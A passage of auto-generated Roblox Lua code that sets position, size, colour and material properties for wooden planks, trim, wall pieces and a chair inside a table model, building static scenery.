        Part536.Size = Vector3.new(2.700000047683716, 7, 0.6999999284744263)
        Part536.Anchored = true
        Part536.BottomSurface = Enum.SurfaceType.Smooth
        Part536.BrickColor = BrickColor.new("White")
        Part536.Material = Enum.Material.SmoothPlastic
        Part536.TopSurface = Enum.SurfaceType.Smooth
        Part536.brickColor = BrickColor.new("White")
        Part537.Parent = Model0
        Part537.CFrame = CFrame.new(-15.7500019, 11861.1504, -19.8000031, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part537.Position = Vector3.new(-15.750001907348633, 11861.150390625, -19.800003051757812)
        Part537.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part537.Size = Vector3.new(2.700000047683716, 7, 0.5999999046325684)
        Part537.Anchored = true
        Part537.BottomSurface = Enum.SurfaceType.Smooth
        Part537.BrickColor = BrickColor.new("White")
        Part537.Material = Enum.Material.SmoothPlastic
        Part537.TopSurface = Enum.SurfaceType.Smooth
        Part537.brickColor = BrickColor.new("White")
        Part538.Name = "Wood Plank"
        Part538.Parent = Model0
        Part538.CFrame = CFrame.new(-17.0000019, 11861.8506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part538.Position = Vector3.new(-17.000001907348633, 11861.8505859375, -25.099998474121094)
        Part538.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part538.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part538.Anchored = true
        Part538.BottomSurface = Enum.SurfaceType.Smooth
        Part538.BrickColor = BrickColor.new("Burnt Sienna")
        Part538.Material = Enum.Material.Wood
        Part538.TopSurface = Enum.SurfaceType.Smooth
        Part538.brickColor = BrickColor.new("Burnt Sienna")
        Part539.Name = "Wood Plank"
        Part539.Parent = Model0
        Part539.CFrame = CFrame.new(-17.0000019, 11862.3506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part539.Position = Vector3.new(-17.000001907348633, 11862.3505859375, -25.099998474121094)
        Part539.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part539.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part539.Anchored = true
        Part539.BottomSurface = Enum.SurfaceType.Smooth
        Part539.BrickColor = BrickColor.new("Burnt Sienna")
        Part539.Material = Enum.Material.Wood
        Part539.TopSurface = Enum.SurfaceType.Smooth
        Part539.brickColor = BrickColor.new("Burnt Sienna")
        Part540.Name = "Wood Plank"
        Part540.Parent = Model0
        Part540.CFrame = CFrame.new(-17.0000019, 11862.8506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part540.Position = Vector3.new(-17.000001907348633, 11862.8505859375, -25.099998474121094)
        Part540.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part540.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part540.Anchored = true
        Part540.BottomSurface = Enum.SurfaceType.Smooth
        Part540.BrickColor = BrickColor.new("Burnt Sienna")
        Part540.Material = Enum.Material.Wood
        Part540.TopSurface = Enum.SurfaceType.Smooth
        Part540.brickColor = BrickColor.new("Burnt Sienna")
        Part541.Name = "Wood Plank"
        Part541.Parent = Model0
        Part541.CFrame = CFrame.new(-17.0000019, 11861.3506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part541.Position = Vector3.new(-17.000001907348633, 11861.3505859375, -25.099998474121094)
        Part541.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part541.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part541.Anchored = true
        Part541.BottomSurface = Enum.SurfaceType.Smooth
        Part541.BrickColor = BrickColor.new("Burnt Sienna")
        Part541.Material = Enum.Material.Wood
        Part541.TopSurface = Enum.SurfaceType.Smooth
        Part541.brickColor = BrickColor.new("Burnt Sienna")
        Part542.Name = "Wood Plank"
        Part542.Parent = Model0
        Part542.CFrame = CFrame.new(-17.0000019, 11860.8506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part542.Position = Vector3.new(-17.000001907348633, 11860.8505859375, -25.099998474121094)
        Part542.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part542.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part542.Anchored = true
        Part542.BottomSurface = Enum.SurfaceType.Smooth
        Part542.BrickColor = BrickColor.new("Burnt Sienna")
        Part542.Material = Enum.Material.Wood
        Part542.TopSurface = Enum.SurfaceType.Smooth
        Part542.brickColor = BrickColor.new("Burnt Sienna")
        Part543.Name = "Wood Plank"
        Part543.Parent = Model0
        Part543.CFrame = CFrame.new(-17.0000019, 11860.3506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part543.Position = Vector3.new(-17.000001907348633, 11860.3505859375, -25.099998474121094)
        Part543.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part543.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part543.Anchored = true
        Part543.BottomSurface = Enum.SurfaceType.Smooth
        Part543.BrickColor = BrickColor.new("Burnt Sienna")
        Part543.Material = Enum.Material.Wood
        Part543.TopSurface = Enum.SurfaceType.Smooth
        Part543.brickColor = BrickColor.new("Burnt Sienna")
        Part544.Name = "Wood Plank"
        Part544.Parent = Model0
        Part544.CFrame = CFrame.new(-17.0000019, 11859.8506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part544.Position = Vector3.new(-17.000001907348633, 11859.8505859375, -25.099998474121094)
        Part544.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part544.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part544.Anchored = true
        Part544.BottomSurface = Enum.SurfaceType.Smooth
        Part544.BrickColor = BrickColor.new("Burnt Sienna")
        Part544.Material = Enum.Material.Wood
        Part544.TopSurface = Enum.SurfaceType.Smooth
        Part544.brickColor = BrickColor.new("Burnt Sienna")
        Part545.Name = "Wood Plank"
        Part545.Parent = Model0
        Part545.CFrame = CFrame.new(-17.0000019, 11858.8506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part545.Position = Vector3.new(-17.000001907348633, 11858.8505859375, -25.099998474121094)
        Part545.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part545.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part545.Anchored = true
        Part545.BottomSurface = Enum.SurfaceType.Smooth
        Part545.BrickColor = BrickColor.new("Burnt Sienna")
        Part545.Material = Enum.Material.Wood
        Part545.TopSurface = Enum.SurfaceType.Smooth
        Part545.brickColor = BrickColor.new("Burnt Sienna")
        Part546.Name = "Wood Plank"
        Part546.Parent = Model0
        Part546.CFrame = CFrame.new(-17.0000019, 11859.3506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part546.Position = Vector3.new(-17.000001907348633, 11859.3505859375, -25.099998474121094)
        Part546.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part546.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part546.Anchored = true
        Part546.BottomSurface = Enum.SurfaceType.Smooth
        Part546.BrickColor = BrickColor.new("Burnt Sienna")
        Part546.Material = Enum.Material.Wood
        Part546.TopSurface = Enum.SurfaceType.Smooth
        Part546.brickColor = BrickColor.new("Burnt Sienna")
        Part547.Name = "Wood Plank"
        Part547.Parent = Model0
        Part547.CFrame = CFrame.new(-17.0000019, 11858.3506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part547.Position = Vector3.new(-17.000001907348633, 11858.3505859375, -25.099998474121094)
        Part547.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part547.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part547.Anchored = true
        Part547.BottomSurface = Enum.SurfaceType.Smooth
        Part547.BrickColor = BrickColor.new("Burnt Sienna")
        Part547.Material = Enum.Material.Wood
        Part547.TopSurface = Enum.SurfaceType.Smooth
        Part547.brickColor = BrickColor.new("Burnt Sienna")
        Part548.Parent = Model0
        Part548.CFrame = CFrame.new(-16.8500004, 11861.1504, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part548.Position = Vector3.new(-16.850000381469727, 11861.150390625, -25.099998474121094)
        Part548.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part548.Size = Vector3.new(0.10000000149011612, 7, 10)
        Part548.Anchored = true
        Part548.BottomSurface = Enum.SurfaceType.Smooth
        Part548.BrickColor = BrickColor.new("Really black")
        Part548.Material = Enum.Material.SmoothPlastic
        Part548.TopSurface = Enum.SurfaceType.Smooth
        Part548.brickColor = BrickColor.new("Really black")
        Part549.Name = "Wood Plank"
        Part549.Parent = Model0
        Part549.CFrame = CFrame.new(-17.0000019, 11857.8506, -25.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part549.Position = Vector3.new(-17.000001907348633, 11857.8505859375, -25.099998474121094)
        Part549.Color = Color3.new(0.415686, 0.223529, 0.0352941)
        Part549.Size = Vector3.new(0.20000000298023224, 0.3999999761581421, 10)
        Part549.Anchored = true
        Part549.BottomSurface = Enum.SurfaceType.Smooth
        Part549.BrickColor = BrickColor.new("Burnt Sienna")
        Part549.Material = Enum.Material.Wood
        Part549.TopSurface = Enum.SurfaceType.Smooth
        Part549.brickColor = BrickColor.new("Burnt Sienna")
        Part550.Parent = Model0
        Part550.CFrame = CFrame.new(-17.1000004, 11857.5498, -24.2999802, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part550.Position = Vector3.new(-17.100000381469727, 11857.5498046875, -24.29998016357422)
        Part550.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part550.Size = Vector3.new(0.19999989867210388, 0.19999995827674866, 12.19999885559082)
        Part550.Anchored = true
        Part550.BottomSurface = Enum.SurfaceType.Smooth
        Part550.BrickColor = BrickColor.new("Lily white")
        Part550.Material = Enum.Material.Wood
        Part550.TopSurface = Enum.SurfaceType.Smooth
        Part550.brickColor = BrickColor.new("Lily white")
        Part551.Parent = Model0
        Part551.CFrame = CFrame.new(-6.89999962, 11868.1504, 22.5499992, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part551.Position = Vector3.new(-6.899999618530273, 11868.150390625, 22.549999237060547)
        Part551.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part551.Size = Vector3.new(0.19999989867210388, 1, 19.100000381469727)
        Part551.Anchored = true
        Part551.BottomSurface = Enum.SurfaceType.Smooth
        Part551.BrickColor = BrickColor.new("Dark stone grey")
        Part551.Material = Enum.Material.SmoothPlastic
        Part551.TopSurface = Enum.SurfaceType.Smooth
        Part551.brickColor = BrickColor.new("Dark stone grey")
        Part552.Parent = Model0
        Part552.CFrame = CFrame.new(-15.6500025, 11855.3506, -25.0999908, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part552.Position = Vector3.new(-15.650002479553223, 11855.3505859375, -25.099990844726562)
        Part552.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part552.Size = Vector3.new(2.5, 2.799999713897705, 10)
        Part552.Anchored = true
        Part552.BottomSurface = Enum.SurfaceType.Smooth
        Part552.BrickColor = BrickColor.new("Mid gray")
        Part552.Material = Enum.Material.Cobblestone
        Part552.TopSurface = Enum.SurfaceType.Smooth
        Part552.brickColor = BrickColor.new("Mid gray")
        Part553.Parent = Model0
        Part553.CFrame = CFrame.new(-15.8500004, 11857.5498, -18.9999847, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part553.Position = Vector3.new(-15.850000381469727, 11857.5498046875, -18.999984741210938)
        Part553.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part553.Size = Vector3.new(2.700000047683716, 0.19999995827674866, 2.1999988555908203)
        Part553.Anchored = true
        Part553.BottomSurface = Enum.SurfaceType.Smooth
        Part553.BrickColor = BrickColor.new("Lily white")
        Part553.Material = Enum.Material.Wood
        Part553.TopSurface = Enum.SurfaceType.Smooth
        Part553.brickColor = BrickColor.new("Lily white")
        Part554.Parent = Model0
        Part554.CFrame = CFrame.new(-15.6500034, 11856.8506, -25.0999928, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part554.Position = Vector3.new(-15.650003433227539, 11856.8505859375, -25.099992752075195)
        Part554.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part554.Size = Vector3.new(2.5, 0.19999995827674866, 9.999999046325684)
        Part554.Anchored = true
        Part554.BottomSurface = Enum.SurfaceType.Smooth
        Part554.BrickColor = BrickColor.new("Lily white")
        Part554.Material = Enum.Material.Wood
        Part554.TopSurface = Enum.SurfaceType.Smooth
        Part554.brickColor = BrickColor.new("Lily white")
        Part555.Parent = Model0
        Part555.CFrame = CFrame.new(-17.1500015, 11861.2002, -29.2499943, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part555.Position = Vector3.new(-17.150001525878906, 11861.2001953125, -29.2499942779541)
        Part555.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part555.Size = Vector3.new(0.09999990463256836, 6.900000095367432, 0.6999999284744263)
        Part555.Anchored = true
        Part555.BottomSurface = Enum.SurfaceType.Smooth
        Part555.BrickColor = BrickColor.new("Institutional white")
        Part555.Material = Enum.Material.SmoothPlastic
        Part555.TopSurface = Enum.SurfaceType.Smooth
        Part555.brickColor = BrickColor.new("Institutional white")
        Part556.Parent = Model0
        Part556.CFrame = CFrame.new(-17.2000008, 11857.7002, -29.2499943, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part556.Position = Vector3.new(-17.200000762939453, 11857.7001953125, -29.2499942779541)
        Part556.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part556.Size = Vector3.new(0.19999989867210388, 0.10000000149011612, 0.6999999284744263)
        Part556.Anchored = true
        Part556.BottomSurface = Enum.SurfaceType.Smooth
        Part556.BrickColor = BrickColor.new("Institutional white")
        Part556.Material = Enum.Material.SmoothPlastic
        Part556.TopSurface = Enum.SurfaceType.Smooth
        Part556.brickColor = BrickColor.new("Institutional white")
        Part557.Parent = Model0
        Part557.CFrame = CFrame.new(-17.25, 11857.5498, -29.2499943, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part557.Position = Vector3.new(-17.25, 11857.5498046875, -29.2499942779541)
        Part557.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part557.Size = Vector3.new(0.09999990463256836, 0.20000000298023224, 0.6999999284744263)
        Part557.Anchored = true
        Part557.BottomSurface = Enum.SurfaceType.Smooth
        Part557.BrickColor = BrickColor.new("Institutional white")
        Part557.Material = Enum.Material.SmoothPlastic
        Part557.TopSurface = Enum.SurfaceType.Smooth
        Part557.brickColor = BrickColor.new("Institutional white")
        Part558.Parent = Model0
        Part558.CFrame = CFrame.new(-17.2000008, 11857.4004, -29.2499943, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part558.Position = Vector3.new(-17.200000762939453, 11857.400390625, -29.2499942779541)
        Part558.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part558.Size = Vector3.new(0.19999989867210388, 0.10000000149011612, 0.6999999284744263)
        Part558.Anchored = true
        Part558.BottomSurface = Enum.SurfaceType.Smooth
        Part558.BrickColor = BrickColor.new("Institutional white")
        Part558.Material = Enum.Material.SmoothPlastic
        Part558.TopSurface = Enum.SurfaceType.Smooth
        Part558.brickColor = BrickColor.new("Institutional white")
        Part559.Parent = Model0
        Part559.CFrame = CFrame.new(-17.0500011, 11855.751, -29.2499943, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part559.Position = Vector3.new(-17.05000114440918, 11855.7509765625, -29.2499942779541)
        Part559.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part559.Size = Vector3.new(0.09999990463256836, 3.4000000953674316, 0.6999999284744263)
        Part559.Anchored = true
        Part559.BottomSurface = Enum.SurfaceType.Smooth
        Part559.BrickColor = BrickColor.new("Institutional white")
        Part559.Material = Enum.Material.SmoothPlastic
        Part559.TopSurface = Enum.SurfaceType.Smooth
        Part559.brickColor = BrickColor.new("Institutional white")
        Part560.Parent = Model0
        Part560.CFrame = CFrame.new(-8.4500103, 11865.1504, 13.1000109, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part560.Orientation = Vector3.new(0, -90, 0)
        Part560.Position = Vector3.new(-8.450010299682617, 11865.150390625, 13.100010871887207)
        Part560.Rotation = Vector3.new(0, -90, 0)
        Part560.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part560.Size = Vector3.new(0.19999989867210388, 1, 2.8999996185302734)
        Part560.Anchored = true
        Part560.BottomSurface = Enum.SurfaceType.Smooth
        Part560.BrickColor = BrickColor.new("Dark stone grey")
        Part560.Material = Enum.Material.SmoothPlastic
        Part560.TopSurface = Enum.SurfaceType.Smooth
        Part560.brickColor = BrickColor.new("Dark stone grey")
        Part561.Parent = Model0
        Part561.CFrame = CFrame.new(-8.40001106, 11866.1504, 13.0500002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part561.Orientation = Vector3.new(0, -90, 0)
        Part561.Position = Vector3.new(-8.40001106262207, 11866.150390625, 13.050000190734863)
        Part561.Rotation = Vector3.new(0, -90, 0)
        Part561.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part561.Size = Vector3.new(0.09999989718198776, 1, 2.999999523162842)
        Part561.Anchored = true
        Part561.BottomSurface = Enum.SurfaceType.Smooth
        Part561.BrickColor = BrickColor.new("Dark stone grey")
        Part561.Material = Enum.Material.SmoothPlastic
        Part561.TopSurface = Enum.SurfaceType.Smooth
        Part561.brickColor = BrickColor.new("Dark stone grey")
        Part562.Parent = Model0
        Part562.CFrame = CFrame.new(-8.4500103, 11867.1504, 13.1000109, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part562.Orientation = Vector3.new(0, -90, 0)
        Part562.Position = Vector3.new(-8.450010299682617, 11867.150390625, 13.100010871887207)
        Part562.Rotation = Vector3.new(0, -90, 0)
        Part562.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part562.Size = Vector3.new(0.19999989867210388, 1, 2.8999996185302734)
        Part562.Anchored = true
        Part562.BottomSurface = Enum.SurfaceType.Smooth
        Part562.BrickColor = BrickColor.new("Dark stone grey")
        Part562.Material = Enum.Material.SmoothPlastic
        Part562.TopSurface = Enum.SurfaceType.Smooth
        Part562.brickColor = BrickColor.new("Dark stone grey")
        Part563.Parent = Model0
        Part563.CFrame = CFrame.new(-8.4500103, 11868.1504, 13.1000109, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part563.Orientation = Vector3.new(0, -90, 0)
        Part563.Position = Vector3.new(-8.450010299682617, 11868.150390625, 13.100010871887207)
        Part563.Rotation = Vector3.new(0, -90, 0)
        Part563.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part563.Size = Vector3.new(0.19999989867210388, 1, 2.8999996185302734)
        Part563.Anchored = true
        Part563.BottomSurface = Enum.SurfaceType.Smooth
        Part563.BrickColor = BrickColor.new("Dark stone grey")
        Part563.Material = Enum.Material.SmoothPlastic
        Part563.TopSurface = Enum.SurfaceType.Smooth
        Part563.brickColor = BrickColor.new("Dark stone grey")
        Part564.Parent = Model0
        Part564.CFrame = CFrame.new(-8.40001106, 11869.1504, 13.0500002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part564.Orientation = Vector3.new(0, -90, 0)
        Part564.Position = Vector3.new(-8.40001106262207, 11869.150390625, 13.050000190734863)
        Part564.Rotation = Vector3.new(0, -90, 0)
        Part564.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part564.Size = Vector3.new(0.09999989718198776, 1, 2.999999523162842)
        Part564.Anchored = true
        Part564.BottomSurface = Enum.SurfaceType.Smooth
        Part564.BrickColor = BrickColor.new("Dark stone grey")
        Part564.Material = Enum.Material.SmoothPlastic
        Part564.TopSurface = Enum.SurfaceType.Smooth
        Part564.brickColor = BrickColor.new("Dark stone grey")
        Part565.Parent = Model0
        Part565.CFrame = CFrame.new(-8.4500103, 11870.4004, 13.1000109, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part565.Orientation = Vector3.new(0, -90, 0)
        Part565.Position = Vector3.new(-8.450010299682617, 11870.400390625, 13.100010871887207)
        Part565.Rotation = Vector3.new(0, -90, 0)
        Part565.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part565.Size = Vector3.new(0.19999989867210388, 1.5, 2.8999996185302734)
        Part565.Anchored = true
        Part565.BottomSurface = Enum.SurfaceType.Smooth
        Part565.BrickColor = BrickColor.new("Dark stone grey")
        Part565.Material = Enum.Material.SmoothPlastic
        Part565.TopSurface = Enum.SurfaceType.Smooth
        Part565.brickColor = BrickColor.new("Dark stone grey")
        Model566.Name = "Table"
        Model566.Parent = Model0
        Model567.Name = "Chair"
        Model567.Parent = Model566
        Part568.Parent = Model567
        Part568.CFrame = CFrame.new(-10.699995, 11854.6504, -9.49998283, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part568.Orientation = Vector3.new(0, 90, 0)
        Part568.Position = Vector3.new(-10.699995040893555, 11854.650390625, -9.499982833862305)
        Part568.Rotation = Vector3.new(0, 90, 0)
        Part568.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part568.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part568.Anchored = true
        Part568.BottomSurface = Enum.SurfaceType.Smooth
        Part568.BrickColor = BrickColor.new("Reddish brown")
        Part568.Material = Enum.Material.Wood
        Part568.TopSurface = Enum.SurfaceType.Smooth
        Part568.brickColor = BrickColor.new("Reddish brown")
        Seat569.Parent = Model567
        Seat569.CFrame = CFrame.new(-9.60000801, 11855.4502, -10.5999889, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Seat569.Orientation = Vector3.new(0, 180, 0)
        Seat569.Position = Vector3.new(-9.600008010864258, 11855.4501953125, -10.59998893737793)
        Seat569.Rotation = Vector3.new(-180, 0, -180)
        Seat569.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat569.Transparency = 1
        Seat569.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat569.Anchored = true
        Seat569.BottomSurface = Enum.SurfaceType.Smooth
        Seat569.BrickColor = BrickColor.new("Reddish brown")
        Seat569.Material = Enum.Material.Wood
        Seat569.TopSurface = Enum.SurfaceType.Smooth
        Seat569.brickColor = BrickColor.new("Reddish brown")
        Part570.Parent = Model567
        Part570.CFrame = CFrame.new(-9.60000801, 11855.8506, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part570.Orientation = Vector3.new(0, 90, 0)
        Part570.Position = Vector3.new(-9.600008010864258, 11855.8505859375, -11.699995040893555)
        Part570.Rotation = Vector3.new(0, 90, 0)
        Part570.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part570.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part570.Anchored = true
        Part570.BottomSurface = Enum.SurfaceType.Smooth
        Part570.BrickColor = BrickColor.new("Reddish brown")
        Part570.Material = Enum.Material.Wood
        Part570.TopSurface = Enum.SurfaceType.Smooth
        Part570.brickColor = BrickColor.new("Reddish brown")
        Part571.Parent = Model567
        Part571.CFrame = CFrame.new(-9.60000801, 11857.0498, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part571.Orientation = Vector3.new(0, 90, 0)
        Part571.Position = Vector3.new(-9.600008010864258, 11857.0498046875, -11.699995040893555)
        Part571.Rotation = Vector3.new(0, 90, 0)
        Part571.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part571.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part571.Anchored = true
        Part571.BottomSurface = Enum.SurfaceType.Smooth
        Part571.BrickColor = BrickColor.new("Reddish brown")
        Part571.Material = Enum.Material.Wood
        Part571.TopSurface = Enum.SurfaceType.Smooth
        Part571.brickColor = BrickColor.new("Reddish brown")
        Part572.Parent = Model567
        Part572.CFrame = CFrame.new(-9.60000801, 11856.6504, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part572.Orientation = Vector3.new(0, 90, 0)
        Part572.Position = Vector3.new(-9.600008010864258, 11856.650390625, -11.699995040893555)
        Part572.Rotation = Vector3.new(0, 90, 0)
        Part572.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part572.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part572.Anchored = true
        Part572.BottomSurface = Enum.SurfaceType.Smooth
        Part572.BrickColor = BrickColor.new("Reddish brown")
        Part572.Material = Enum.Material.Wood
        Part572.TopSurface = Enum.SurfaceType.Smooth
        Part572.brickColor = BrickColor.new("Reddish brown")
        Part573.Parent = Model567
        Part573.CFrame = CFrame.new(-9.60000801, 11857.4502, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part573.Orientation = Vector3.new(0, 90, 0)
        Part573.Position = Vector3.new(-9.600008010864258, 11857.4501953125, -11.699995040893555)
        Part573.Rotation = Vector3.new(0, 90, 0)
        Part573.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part573.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part573.Anchored = true
        Part573.BottomSurface = Enum.SurfaceType.Smooth
        Part573.BrickColor = BrickColor.new("Reddish brown")
        Part573.Material = Enum.Material.Wood
        Part573.TopSurface = Enum.SurfaceType.Smooth
        Part573.brickColor = BrickColor.new("Reddish brown")
        Part574.Parent = Model567
        Part574.CFrame = CFrame.new(-9.60000801, 11857.8506, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part574.Orientation = Vector3.new(0, 90, 0)
        Part574.Position = Vector3.new(-9.600008010864258, 11857.8505859375, -11.699995040893555)
        Part574.Rotation = Vector3.new(0, 90, 0)
        Part574.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part574.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part574.Anchored = true
        Part574.BottomSurface = Enum.SurfaceType.Smooth
        Part574.BrickColor = BrickColor.new("Reddish brown")
        Part574.Material = Enum.Material.Wood
        Part574.TopSurface = Enum.SurfaceType.Smooth
        Part574.brickColor = BrickColor.new("Reddish brown")
        Part575.Parent = Model567
        Part575.CFrame = CFrame.new(-10.699995, 11856.751, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part575.Orientation = Vector3.new(0, 90, 0)
        Part575.Position = Vector3.new(-10.699995040893555, 11856.7509765625, -11.699995040893555)
        Part575.Rotation = Vector3.new(0, 90, 0)
        Part575.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part575.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part575.Anchored = true
        Part575.BottomSurface = Enum.SurfaceType.Smooth
        Part575.BrickColor = BrickColor.new("Reddish brown")
        Part575.Material = Enum.Material.Wood
        Part575.TopSurface = Enum.SurfaceType.Smooth
        Part575.brickColor = BrickColor.new("Reddish brown")
        Part576.Parent = Model567
        Part576.CFrame = CFrame.new(-8.50000381, 11856.751, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part576.Orientation = Vector3.new(0, 90, 0)
        Part576.Position = Vector3.new(-8.500003814697266, 11856.7509765625, -11.699995040893555)
        Part576.Rotation = Vector3.new(0, 90, 0)
        Part576.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part576.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part576.Anchored = true
        Part576.BottomSurface = Enum.SurfaceType.Smooth
        Part576.BrickColor = BrickColor.new("Reddish brown")
        Part576.Material = Enum.Material.Wood
        Part576.TopSurface = Enum.SurfaceType.Smooth
        Part576.brickColor = BrickColor.new("Reddish brown")
        Part577.Parent = Model567
        Part577.CFrame = CFrame.new(-10.699995, 11854.6504, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part577.Orientation = Vector3.new(0, 90, 0)
        Part577.Position = Vector3.new(-10.699995040893555, 11854.650390625, -11.699995040893555)
        Part577.Rotation = Vector3.new(0, 90, 0)
        Part577.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part577.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part577.Anchored = true
        Part577.BottomSurface = Enum.SurfaceType.Smooth
        Part577.BrickColor = BrickColor.new("Reddish brown")
        Part577.Material = Enum.Material.Wood
        Part577.TopSurface = Enum.SurfaceType.Smooth
        Part577.brickColor = BrickColor.new("Reddish brown")
        Part578.Parent = Model567
        Part578.CFrame = CFrame.new(-9.60000801, 11856.251, -11.699995, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part578.Orientation = Vector3.new(0, 90, 0)
        Part578.Position = Vector3.new(-9.600008010864258, 11856.2509765625, -11.699995040893555)
        Part578.Rotation = Vector3.new(0, 90, 0)
        Part578.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part578.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part578.Anchored = true
        Part578.BottomSurface = Enum.SurfaceType.Smooth
        Part578.BrickColor = BrickColor.new("Reddish brown")
        Part578.Material = Enum.Material.Wood
        Part578.TopSurface = Enum.SurfaceType.Smooth
        Part578.brickColor = BrickColor.new("Reddish brown")
        Part579.Parent = Model567
        Part579.CFrame = CFrame.new(-8.50000381, 11854.6504, -9.49998283, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part579.Orientation = Vector3.new(0, 90, 0)
        Part579.Position = Vector3.new(-8.500003814697266, 11854.650390625, -9.499982833862305)
        Part579.Rotation = Vector3.new(0, 90, 0)
        Part579.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part579.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part579.Anchored = true
        Part579.BottomSurface = Enum.SurfaceType.Smooth
        Part579.BrickColor = BrickColor.new("Reddish brown")
